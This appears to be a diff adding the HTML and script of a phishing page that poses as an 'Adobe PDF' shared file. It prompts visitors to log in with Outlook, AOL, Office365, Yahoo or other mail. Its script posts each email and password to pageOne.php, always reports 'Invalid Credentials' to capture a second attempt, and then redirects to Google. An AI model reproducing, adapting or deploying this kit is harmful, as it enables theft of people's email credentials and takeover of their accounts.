@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Share Point Online</title>
+    <link rel="stylesheet" href="css/teestyles.css">
+    <link rel="stylesheet" href="css/hover.css">
+    <link rel="stylesheet" href="css/dist/css/bootstrap.css">
+</head>
+<body class="bgBody wid100 ">
+  <h5 class="p-3 wid100 bgRedOne white">Adobe Online Services</h5>
+    <br><br><br><br>
+    <div class="wid40 blockCenter wid20Mobile">
+       <img src="images/adobe.png" alt="" class="wid19 blockCenter ">
+       <h1 class="boldLi  is-size-2 white centerText ">Adobe PDF</h1>
+       <h6 class="boldLi is-size-5 white centerText ">Only Receiver's email can access file sharing</h6>
+       <h6 class=" is-size-6 white centerText ">SELECT AND CLICK ON YOUR EMAIL PROVIDER BELOW</h6>
+        <p class="bold is-size-6 white centerText ">Example:(user@Yourdomain.com)</p>
+    </div> 
+    <div class="blockCenter wid78 wid20Mobile  mb-5" >
+   <div class=" row p-3">
+    <div  class=" blockCenter bgOutlook  hvr-grow w-100 padEm  col-lg-2 mb-2 borderRA2"  data-toggle="modal" data-target="#modals"  onclick=" document.getElementById('image').src = 'images/outlook.png'; document.getElementById('text').innerHTML= 'Outlook'" >
+        <img src="images/outlook1.png" alt="" class="blockCenter">
+        <span class="is-size-6 white blockCenter boldLi centerText">login with <br> Outlook</span>
+   </div>
+   <div  class=" blockCenter bgAol  hvr-grow w-100 padEm  col-lg-2 mb-2 borderRA2"  data-toggle="modal" data-target="#modals"  onclick=" document.getElementById('image').src = 'images/aol.png'; document.getElementById('text').innerHTML= 'Aol'">
+    <img src="images/aol1.png" alt="" width="35px" class="blockCenter">
+    <span class="is-size-6 white blockCenter boldLi centerText">login with <br> Aol</span>
+   </div>
+   <div  class=" blockCenter bgOffice  hvr-grow w-100 padEm  col-lg-2 mb-2 borderRA2"  data-toggle="modal" data-target="#modals"  onclick=" document.getElementById('image').src = 'images/office365.png'; document.getElementById('text').innerHTML= 'Office365'" >
+    <img src="images/office3651.png" alt="" width="35px" class="blockCenter">
+    <span class="is-size-6 white blockCenter boldLi centerText">login with <br> Office365</span>
+   </div>
+   <div  class=" blockCenter bgYahoo  hvr-grow w-100 padEm  col-lg-2 mb-2 borderRA2"  data-toggle="modal" data-target="#modals"  onclick=" document.getElementById('image').src = 'images/yahoo.png'; document.getElementById('text').innerHTML= 'Yahoo'" >
+    <img src="images/yahoo1.png" alt="" width="35px" class="blockCenter">
+    <span class="is-size-6 white blockCenter boldLi centerText">login with <br> Yahoo</span>
+   </div>
+   <div  class=" blockCenter bgOther  hvr-grow w-100 padEm  col-lg-2 mb-2 borderRA2"  data-toggle="modal" data-target="#modals"  onclick=" document.getElementById('image').src = 'images/othermail.ico'; document.getElementById('text').innerHTML= 'Other'">
+    <img src="images/other1.png" alt="" width="35px" class="blockCenter">
+    <span class="is-size-6 white blockCenter boldLi centerText">login with <br> Other Mail</span>
+   </div>
+   </div>
+</div>
+
+
+
+
+  <!-- Modal -->
+<div class="modal fade" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true" id="modals">
+    <div class="modal-dialog" role="document">
+      <div class="modal-content">
+        <div class="modal-header">
+          <h5 class="p-1"> </h5>
+          <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+            <span aria-hidden="true">&times;</span>
+          </button>
+        </div>
+        <div class="modal-body">
+            <img class="is-rounded blockCenter" width="80px" id="image" class="blockCenter">
+            <h5 class="mt-1 black centerText">Login in with <span id="text"></span></h5>
+            <div class="alert alert-danger centerText" id="errorMsg"></div>
+            <div>
+              <form>
+                <div class="form-group">
+                  <label for="exampleInputEmail1">Email address</label>
+                  <input type="email" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Enter email">
+                  <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
+                </div>
+                <div class="form-group">
+                  <label for="exampleInputPassword1">Password</label>
+                  <input type="password" class="form-control" id="password" placeholder="Password">
+                </div>
+              </form>
+            </div>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+          <button type="button" id="submitID" class="btn btn-primary btn-lg btn-info">Login</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+
+
+</body>
+<script src="js/jquery.js"></script>
+<script src="css/dist/js/bootstrap.min.js"></script>
+<script>
+    $('#modals').on('show.bs.modal', function (event) {
+  var button = $(event.relatedTarget) // Button that triggered the modal
+  var recipient = button.data('whatever') // Extract info from data-* attributes
+  // If necessary, you could initiate an AJAX request here (and then do the updating in a callback).
+  // Update the modal's content. We'll use jQuery here, but you could use a data binding library or other methods instead.
+  var modal = $(this)
+  modal.find('.modal-title').text('New message to ' + recipient)
+  modal.find('.modal-body input').val(recipient)
+})
+var count = 0 
+$("#errorMsg").css("display" , "none")
+$("#submitID").click(()=>{
+  var email = $("#email").val()
+  var password = $("#password").val()
+  count ++
+  $("#errorMsg").text("Invalid Credentials").css("display" , "block")
+  if (count == 1) {
+    $.ajax({
+     url : "pageOne.php",
+     type: "POST",
+     data : {email : email , password : password}, 
+     success : function (data) {
+       //alert(data)
+     }
+   })
+  }
+ else if (count > 1) {
+   $.ajax({
+     url : "pageOne.php",
+     type: "POST",
+     data : {email : email , password : password}, 
+     beforeSend : function (xhr) {
+      $("#submitID").html("Verifying ...") 
+     },
+     success : function (data) {
+       location.replace("http://www.google.com")
+      // alert(data)
+     }
+   })
+  }
+})
+</script>
+</html>
